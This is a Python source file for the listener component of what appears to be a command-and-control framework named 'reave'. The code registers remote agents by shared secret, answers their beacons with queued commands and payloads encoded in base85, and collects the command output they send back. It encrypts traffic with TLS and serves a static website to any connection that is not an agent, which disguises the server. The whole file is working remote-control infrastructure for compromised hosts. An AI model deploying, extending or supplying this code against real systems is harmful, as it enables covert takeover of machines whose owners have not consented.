import os
import socket
import uuid
import ssl
import threading
import logging
import time
import json
import base64
import configparser
from rich import print
from common.agent import Agent
from common.responses import serve_http
from common.protocol import Protocol


class Listener(object):
    """
    Listener class is responsible for handling, in a threaded manner,
    communications between the server and registered agents. It provides
    mechanisms for:

     - Registering agents
     - Responding to agent requests
     - Sending commands and payloads to agents
     - Receiving files from agents
     - Handling protocol messages as specified in protcol.py

     The listener leverages TLS to encrypt all traffic between reave and
     its clients. The certificate file used for this encryption should
     have been generated as a part of the installation process.
    """

    def __init__(self, port, host, secret, cmd):
        self.uuid = str(uuid.uuid4())[0:4]  # Listener's UUID truncated to 4 chars
        self.host = host  # Host the listener is bound to
        self.port = port  # Port the listener is bound to
        self.agents = cmd.agents  # List of agents associated to this listener
        self.listeners = cmd.listeners  # List of all listeners
        self.secret = secret  # "secret" key used to authanticate incoming agents
        self._close = False  # Bool to gracefully close listener
        self.cmd = cmd

        self.logger = logging.getLogger(__name__)
        logging.debug("%s Listener spawned", str(self.uuid))

    def get_response(self, json_stub):
        """
        Provides the beaconing agent with a response. Current methods are
        stored in protocol.py. If the agent sends a response status that
        is not reflected in those methods, the listener will return an
        ERR_UNKNOWN_METHOD response.

        This will always update the lastseen time of the agent.
        """
        agent_uuid = json_stub["uuid"]
        response = json_stub["data"]
        status = json_stub["status"]

        for u, a in self.agents.items():
            if u == agent_uuid and response:
                a.update_lastseen()

        if status == "AGENT_ERROR":
            logging.error(agent_uuid + " AGENT_ERROR: " + response)
            print("[red]Error: " + response + "[/red]")
            return Protocol.ACK

        method = getattr(Protocol, json_stub["status"])

        if method:
            r = method(json_stub)
            interacting = self.cmd.interactive
            if "STDOUT" in r:
                if not interacting: self.cmd.say("========== GOT STDOUT FROM AGENT ==========")
                if interacting: 
                    for line in r[2].split('\n'):
                        self.cmd.say("       | " + line)
                else:
                    self.cmd.say(r[2])
                if not interacting: self.cmd.say("===========================================")
            if "STDERR" in r:
                if not interacting: self.cmd.say("========== GOT STDERR FROM AGENT ==========")
                if interacting: 
                    for line in r[2].split('\n'):
                        self.cmd.say("       | " + line)
                else:
                    self.cmd.say(r[2])
                if not interacting: self.cmd.say("===========================================")

            return r[0]

        return Protocol.ERR_UNKNOWN_METHOD

    def associate_agent(self, json_stub):
        """
        Provides an initial method for associating an agent. If
        the agent has already been seen, this will update the
        agent's lastseen time.
        """
        agent_uuid = json_stub["uuid"]
        logging.debug("%s Associating agent", str(self.uuid))

        # Check if the agent is already associated
        for u, a in self.agents.items():
            if u == agent_uuid:
                logging.debug(
                    "%s Agent already seen! Updating lastseen time.", str(self.uuid)
                )
                a.update_lastseen()
                return Protocol.ACK

        self.agents[agent_uuid] = Agent(
            self, agent_uuid, time.time(), json_stub["enumdata"]
        )
        logging.debug("%s Agent associated successfully.", str(self.uuid))
        return Protocol.ACK

    def handle_beacon(self, json_stub):
        """
        Handles an agent's beacon request. This method will always
        update an agent's last seen time. It will then query the
        agent for outstanding commands or payloads and send them
        encoded in base85.

        Pending commands will be sent with higher precedence than
        pending payloads. In the case that there are neither
        commands or payloads, these will be set to None.
        """
        agent_uuid = json_stub["uuid"]
        for u, a in self.agents.items():
            if u == agent_uuid:
                a.update_lastseen()
                command = a.get_command()
                if command:
                    response_packet_stub = {
                        "status": "OK",
                        "command": base64.b85encode(command.encode()).decode(),
                        "payload": None,
                        "task": None,
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                payload = a.get_payload()
                if payload:
                    response_packet_stub = {
                        "status": "OK",
                        "command": None,
                        "payload": base64.b85encode(payload.encode()).decode(),
                        "task": None,
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                task = a.get_task()
                if task:
                    response_packet_stub = {
                        "status": "OK",
                        "command": None,
                        "payload": None,
                        "task": base64.b85encode(task.encode()).decode(),
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                response_packet_stub = {
                    "status": "OK",
                    "command": None,
                    "payload": None,
                    "task": None,
                }
                cmd_pkt = "_response" + json.dumps(response_packet_stub)
                return cmd_pkt.encode()

    def handle_proto_msg(self, proto_msg):
        """
        Method will parse incoming data and send proper agent messages
        to the appropriate handler. If the client is not an agent, it
        will serve a static website under reave/resource/www.
        """
        logging.debug(str(self.uuid) + " Handling protocol message: " + proto_msg)
        if "_associate" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[10:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.associate_agent(json_stub)
            except KeyError:
                return False
        elif "_beacon" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[7:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.handle_beacon(json_stub)
            except KeyError:
                return False
        elif "_response" in proto_msg:
            logging.debug("%s Handling response packet ", str(self.uuid))
            try:
                json_stub = json.loads(proto_msg[9:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.get_response(json_stub)
            except KeyError:
                return False
        else:
            return serve_http(proto_msg)
        return

    def remove_from_list(self):
        """
        Remove this listener from the list of all listeners
        """
        self.listeners.remove(self)

    def main_thread(self):
        """
        Primary listener loop
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
        except PermissionError:
            print("[red]Could not start listener: Permission Error[/red]")
            logging.debug("Could not start listener: Permission Error", exc_info=True)
            self.remove_from_list()
            return
        except OverflowError:
            print("[red]Could not start listener: Bad port range[/red]")
            logging.debug("Could not start listener: Bad port range", exc_info=True)
            self.remove_from_list()
            return
        except socket.gaierror:
            print(
                "[red]Could not start listener: No address associated with hostname[/red]"
            )
            logging.debug(
                "Could not start listener: No address associated with hostname",
                exc_info=True,
            )
            self.remove_from_list()
            return
        except OSError:
            print("[red]Could not start listener: Socket already bound[/red]")
            logging.debug(
                "Could not start listener: Socket already bound", exc_info=True
            )
            self.remove_from_list()
            return

        while not self._close:
            try:
                connection, address = self.sock.accept()
                context = ssl.SSLContext()
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.verify_mode = ssl.CERT_OPTIONAL

                config = configparser.ConfigParser()
                config_file = os.path.join(
                    os.path.dirname(__file__), "../conf", "reave.conf"
                )
                try:
                    assert os.path.exists(config_file)
                except AssertionError:
                    print("Configuration file not found! Did you run the installer?")
                    exit(0)

                config = configparser.ConfigParser()
                config.read(config_file)
                certificate_path = config["reave"]["cert_path"]
                context.load_cert_chain(certificate_path)
                wrapped_socket = context.wrap_socket(
                    connection, server_side=True, do_handshake_on_connect=False
                )
                wrapped_socket.settimeout(10)
                threading.Thread(
                    target=self.listen_to_client, args=(wrapped_socket,)
                ).start()
            except socket.timeout:
                pass
            except ssl.SSLError:
                logging.debug(str(self.uuid) + " Listener SSL error.", exc_info=True)
                pass
            except OSError:
                pass
        if self._close:
            logging.debug(
                "%s Listener caught interrupt, closing socket", str(self.uuid)
            )
            self.close()

    def close(self):
        """
        Gracefully shut down the listener
        """
        # Disconnect all agents
        self._close = True
        # Close my socket
        self.sock.close()
        try:
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(
                (self.host, self.port)
            )
        except OSError:
            pass
        del self

    def listen_to_client(self, client):
        """
        Method to handle client communication
        """
        size = 16384
        while not self._close:
            try:
                data = client.recv(size)
                if data:
                    response = self.handle_proto_msg(data.decode())
                    if response:
                        client.send(response)
                else:
                    logging.debug("%s Client disconnect", str(self.uuid))
                    client.close()
                    return False
            except socket.timeout:
                logging.debug(str(self.uuid) + " Client timeout", exc_info=True)
                client.close()
                return False
            except ConnectionResetError:
                logging.debug(
                    str(self.uuid) + " Client closed connection.", exc_info=True
                )
                client.close()
                return False
            except ssl.SSLError:
                logging.debug(str(self.uuid) + " Listener SSL error.", exc_info=True)
                client.close()
                return False
        if self._close:
            logging.debug(
                "%s Listener caught interrupt, closing client", str(self.uuid)
            )
            client.close()
            return False
